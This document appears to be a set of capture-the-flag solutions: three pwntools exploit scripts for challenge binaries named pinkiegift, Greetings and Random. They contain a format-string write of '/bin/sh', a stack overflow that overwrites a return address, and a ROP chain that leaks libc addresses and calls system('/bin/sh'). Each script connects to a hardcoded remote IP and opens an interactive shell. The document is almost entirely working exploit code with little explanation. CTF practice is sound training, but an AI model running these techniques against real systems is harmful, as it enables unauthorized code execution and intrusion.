## pingiegift

```
from pwn import *

def generate_format(addr, value):
    payload = fmtstr_payload(1, {addr:value},write_size='short')
    return payload


context(os="linux",arch="i386",log_level="DEBUG",endian="little")
context.terminal = ['tmux', 'split', '-h']

#sh=process("./pinkiegift")
#sh=remote("127.0.0.1",9999)
sh=remote("199.247.6.180", 10006)
#gdb.attach(sh,"b *0x080485f7")
str=sh.recvline()
binsh=0x08049940
system=str.split()[7]
binsh_value=0x68732f6e69622f

payload1=p32(binsh)+p32(binsh+1)+p32(binsh+2)+p32(binsh+3)+p32(binsh+4)+p32(binsh+5)+p32(binsh+6)+"%19c%1$hhn%51c%2$hhn%7c%3$hhn%5c%4$hhn%193c%5$hhn%68c%6$hhn%245c%7$hhn"
sh.sendline(payload1)
sh.recvline()
sh.sendline("a"*0x84+"bbbb"+p32(int(system,16))+p32(binsh)+p32(binsh))

sh.interactive()
```

## Greating
```
from pwn import *

main=0x08048636
context(os="linux",arch="i386",log_level="DEBUG",endian="little")
context.terminal = ['tmux', 'split', '-h']
#sh=process("Greetings")
sh=remote("199.247.6.180", 10003)
#gdb.attach(sh,"b *0x08048634")
sh.recvuntil("Greetings from Santa! Wanna talk? ")
sh.sendline("y"*0x40+"\x98\x88\x04\x08")
sh.interactive()
```

## random
这个要用libcdatabase，找到libc然后再加载libc
```
from pwn import *
context(os="linux",arch="amd64",endian="little")

pop_rdi=0x40077b
puts_plt = 0x400550
puts_got = 0x601018
gets_got = 0x601028
alarm_got = 0x601020
main=0x400676

context.log_level="debug"
libc=ELF("./libc6.2.so")

#sh=process("./Random")
sh=remote("199.247.6.180",10005)
sh.recvuntil("me!")
payload='a' * 0x20 + 'bbbbbbbb' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)+p64(main)
sh.sendline(payload)
puts_addr=u64(sh.recvuntil('\x7f')[-6:]+'\x00\x00')
success("puts -> {:#x}".format(puts_addr))

payload='a' * 0x20 + 'bbbbbbbb' + p64(pop_rdi) + p64(alarm_got) + p64(puts_plt)+p64(main)
sh.sendline(payload)
alarm_addr=u64(sh.recvuntil('\x7f')[-6:]+'\x00\x00')
success("alarm -> {:#x}".format(alarm_addr))

payload='a' * 0x20 + 'bbbbbbbb' + p64(pop_rdi) + p64(gets_got) + p64(puts_plt)+p64(main)
sh.sendline(payload)
gets_addr=u64(sh.recvuntil('\x7f')[-6:]+'\x00\x00')
success("gets -> {:#x}".format(gets_addr))
print "\n"
libc.address=puts_addr-libc.sym['puts']
success("libc -> {:#x}".format(libc.address))
success("puts -> {:#x}".format(libc.sym['puts']))
success("alarm-> {:#x}".format(libc.sym['alarm']))
success("gets -> {:#x}".format(libc.sym['gets']))

sh.recvuntil("me!")

payload1='a' * 0x20 + 'bbbbbbbb' + p64(pop_rdi) + p64(next(libc.search("/bin/sh"))) + p64(libc.sym['system'])+p64(main)
sh.sendline(payload1)
sh.interactive()
```
